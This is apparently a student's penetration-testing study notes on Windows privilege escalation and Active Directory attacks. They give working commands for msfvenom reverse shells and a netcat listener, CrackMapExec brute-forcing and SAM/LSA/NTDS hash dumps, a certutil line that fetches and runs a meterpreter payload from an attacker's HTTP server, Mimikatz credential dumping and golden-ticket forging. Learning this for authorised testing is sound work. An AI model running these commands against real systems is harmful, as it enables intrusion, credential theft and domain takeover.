# pentesting



ENUMERATION 

****************************************
nMap: 

Network scanning: network scanning is process of identifying active hosts on target network to create a detailed schematic of network infrastructure


Port scanning: probing target with specific TCP flags with aim of enumerating the running services and their respective ports based on responses from the target. Ie use these TCP flags, probe target with them in packets to determine target OS, service versions, and check for packet filtering/ firewall  

TCP Flags: 
URG (urgent): packet to be processed immediately 
PSH (push): transmits data immediately 
FIN (finish): no further transmission 
ACK (acknowledgement): acknowledges receipt of packet
SYN (synchronization): initializers connection between host and target 
RST (reset): resets the connection 




Performs reverse DNS resolution 
State of port can be open, closed or filtered 
Is port open, filtered, closed? 


****************************************

WINDOWS PRIV ESC  (post exploitation) 

# kali command 
> windows command prompt 
PS > windows powershell 


Permissions in Windows 

User accounts: log into Window system 
Administrator user account created by default 

Service accounts: used to run services in Windows, can’t be used to sign in 
SYSTEM account: default service account with the highest privileges of any local account in Windows 
NETWORK SERVICE, LOCAL service → other default service account 


User accounts can belong to multiple groups. Set permissions for many accounts at a time 
Regular groups → have a set list of members
Pseudo groups → have a dynamic list of members which changes based on various interactions 

Resources = objects: 
files/directories
Registry entries 
Services 
Resources have access control list, allowing/denying certain user/group to perform action on resource 

ACL: access control list. Made up of zero or more access control entires. ACE defines relationship between principle (user, group) and certain access right 

Spawning reverse shells 
Generate reverse shell with msfvenom, caught using netcat

Msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe 
nc -nlvp 53 → to catch the reverse shell 

FINISH 

Or RDP session 

winPEAS: Priv Esc Tool 

winPeas: binary that can be used to automate all the traditional information gathering checks on a windows system, gives u diagnostic information on vulnerabilities, etc. 

Before running winPeas, add registry key: 
add HKCU\Console /v VirtualterminalLevel /t REG_DWORD /d 1 → enables colors
Open new command prompt 

Can also get color codes with reverse shells 

PowerUp: Priv Esc Tool 

Run PowerUp.ps1 in Powershell session 

. .\PowerUp.ps1
Invoke-AllChecks

SharpUp: 

Run in regular command line or Powershell session 

.\SharpUp.exe


Seatbelt

Run seatbelt.exe with no options → prints all options 
Then run seatbelt.exe with an option 

Seatbelt.exe all → runs all checks 

Kernel 

Kernel has complete control → kernel exploit results in SERVICE user 
Get windows version/patch level 
Can find corresponding exploit with windows version in ExploitDB 

Can use Windows Exploit Suggester: 
Download output of systeminfo command 

FINISH


Service Exploits 

Services: like daemons in Windows, accepting input or performing regular tasks 
Services run with SYSTEM privileges can be misconfigured, exploiting them can lead to command execution with SYSTEM privileges 


****************************************

ACTIVE DIRECTORY




Possible attacks: 
LLMNR Poisoning 
SMB Relay Attacks 
Kerberoasting 
Golden/Silver Ticket 
Pass The Hash (PtH) 
Pass the Password (PtP) 
Dump cached credentials (Mimikatz) 
Bloodhound/Empire/PowerView/Enumeration tools 



Active Directory 


Windows domain: group of users and computer under administration of a given business. centralize administration of common components in a Windows computer network into AD (Active directory) single repository 

Domain controller (DC): server that runs Active Directory services 

Active directory: identity management database, lets IT teams define what users do on a network. Holds data in terms of objects. Object can be single resource element, or group, user, app, or device 
Objects have related attributes 

AD has 4 essential services: 
AD DS Active Directory Domain Services 





Centralized management
Use domain controller and push to all joined computers 
Can 
Change passwords
Group policies 
Etc





****************************************

Active Directory Enumeration with Powerview 


powershell -ep bypass: open powershell 
Once you open powershell, run the PowerView.ps1, and now you can execute PowerView commands 

Get-NetUser → returns user accounts on machine, and their info including SID. sid with 500 → admin account

To specify: Get-NetUser | select cn, obectssid, adspath 

Get-NetGroup -Domain DOMAINNAME.local

Get-NetGroup -AdminCount → gives u admin groups 

Get-NetUser -Username Admin2

Get-NetGroup → displays all groups as part of domain 

Get-NetGroup -UserName Admin2 → gives list of groups that Admin2 is part of, what privileges they have based on their joined groups 

Get-NetGroupMember -GroupName “GROUPNAME” → gets list of group members 

Get-NetComputer → gives you list of users in AD environment 

Get-NetComputer -Ping → gives u which one are active 

Get-NetComputer –fulldata → gives you more information 
Get-NetComputer –fulldata | operatingsystem 

Get-NetDomain → gives you domain 

Get-DomainSID

Get-DomainPolicy → gives you domain policy information, gives you configuration information 

Get-NetDomainController → gives you domain controller 

If you compromise domain controller, find which computers you can access w admin access by doing 
Find-LocalAdminAccess 

Get-NetGPO → gives you group policies 

Get-NetLoggedOn → get users currently logged onto to our computer 

Invoke-ShareFinder → finds all shares within domains 

****************************************

BloodHound

Visualize the data you have gathered 

Sharp Hound is the data collector tool for bloodhound 

sudo neo4j console  
Open the address in browser 

Default credentials is neo4j and password is neo4j 


In a new tab do bloodhound to startup bloodhound interface 

New terminal tab 

Go into the target machine 
Ex. ssh Adminstirato@10.10.210.55

3a) powershell -ep bypass
3b) . .\SharpHound.ps1 
3c)  Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
 
Transfer the loot.zip file back to the windows 

In the kali: 
pscp Administrator@IPADDRESS:/Users/Adminstrator/Downloads/ ~/Documents 

Kind of like ssh, gets the file from the windows machine and puts it in downloads 

pscp is part of putty tools package (you can install it with sudo apt-get install putty-tools)


Open bloodhound and then import downloaded graph 

Go into analysis in menu 
Find all Domain admin 



CrackMapExec 

Type crackmapexec to get started 

Crackmapexec smb -h → prints out help menu for smb module 

Crackmapexec smb IPADDRESS (client ip address)
 
Lets say you have username text file and password text file, to start bruteforcing with both of them: 

crackmapexec smb IPADDRESS -u usernames -p passwords –continue-on-success 

	Prints out (Pwn3d!) if the user you are targeting is domain admin, and just normal domain user 

 Smb(server message block) shares: provides access to resources like files, printers, interfaces, etc. and communication between network processes. Can mount shared file folder on Windows/Mac 

To enumerate smb shares: 
crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ –shares 

To enumerate active sessions: 
crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ –disks 
//prints out all disks on system 

To get all usernames on system: 

Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ –users 

To get the password policy: 
Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ –pass-pol 

To dump hashes/credential gathering: 
–sam → dump SAM hashes from target systems 
–lsa → dump LSA secrets from target systems 
–ntds → dump NTDS.dit from target DCs 


Ex. 
Crackmapexec smb IPADDRES -u ‘username’ -p ‘password’ –ntds 


To list groups on domain controller: 
Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ –groups 

To get modules in crackmap exec: 
Crackmapexec smb -L 


To use a specific module: 
Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ -M mimikatz 
Prints out NTLM hash for the admin user 


Can also specify a specific command
Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ -o COMMAND=’privilege::debug’

Execute command on target system

crackmapexec -x COMMAND 
crackmapexec -X PS_COMMAND 

Generate payload using metasploit 
Ex. msfvenom -p windows/x64/meterpreter/reverce_tcp lhost=IPADDRES lport=PORT -f exe -o meterpreter_shell.exe (output file) 

Start an http server on the port: 
python3 -m http.server 8088

Crackmapexec smb IPADDRESS -u ‘username’ -p ‘password’ -x ‘certutil -urlcache -f http://IP:8088/meterpreter_shell.exe && cmd /c meterpreter_shell.exe’

//using certutil to download the payload 


****************************************

Mimikatz 

Mimikatz: post exploitation tool used for dumping user creds inside AD network 
Dump NTLM hashes with mimikatz, then crack those hashes using hashcat 

NTLM: single sign on tool that used in Windows, relies on challenge-response protocol to confirm user and they don’t have to submit password 

	The challenge-response mechanism: 
The negotiation message from client 
Challenge message from server 
Authentication message from client 

NTLM is replaced by Kerberos 
Kerberos is an authentication protocol, replaced NTLM 
NTLM has a three way handshake between client and server to authenticate a user 
Kerberos has a two part process with a ticket granting service/ key distribution center 

NTLM uses password hashing 
Kerberos uses encryption 


You can also generate golden tickets with Mimikatz: 

Used for extracting plain text credentials from memory, password hashes, advanced kerberos functionality (ie. generate golden tickets) 


To execute: 
Mimikatz.exe 

Need to check privileges: 
Privilege::debug 
//tells us if we have adequate privileges bc mimikatz needs admin to work 

Dump clear text passwords: 
sekurlsa::logonpasswords


SAM database: security account manager database, db file found on Windows, stores user account passwords 

lsadump::sam → dump contents of SAM database 


Lsa: 

Local security authority: 

lsadump::lsa /patch 
Gives you NTLM hashes for each user accounts 



To crack hashes with hashcat

hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt –show 

(-m 1000 refers to NTLM) 



Golden ticket attacks: 

Krbtgt: local account in an active directory environment that is utilized for key distribution/ ticket distribution 

Golden ticket attack: generate authentication token for krbtgt account


Dump the hash and sid of krbtgt user, create a golden ticket, use golden ticket to open a new command prompt that lets us access any machine on network  


Dump krbtgt hash: 

Privilege::debug
lsadump::lsa /inject /name:krbtgt 
//Dumps hash + security identifier of Kerberos ticket granting ticket account, create a golden ticket 



Copy all the information from the dump 
Create golden ticket 

Ex. 

mimikatz  # kerberos::golden /user:Administrator /domain:controller.local /sid:pasted from dump 
/krbt:pasted from dump /id:500 (cuz its admin id) 

Should output final ticket saved to file 

Use golden ticket to login  
misc::cmd → opens new command prompt with elevated access to all machines 
Kerberos ticket is in memory 




****************************************


Active directory Basics: 

Domain administrator: user who been granted highest level of access to a specific domain 
Can make/modify/delete objects within the domain

Domain controller: server that has copy of AD database and manages all authentication requests within domain, can manage and verify identity of users and computers that try to log into domain

manages/replicates AD database across multiple servers within the domain 

Manages group policy (group policy is the set of rules that govern the behaviour of computer and users on domain) 



LDAP: 

Lightweight Directory Access Protocol 
LDAP is a way of speaking to the AD 
LDAP is a protocol used to talk to AD 
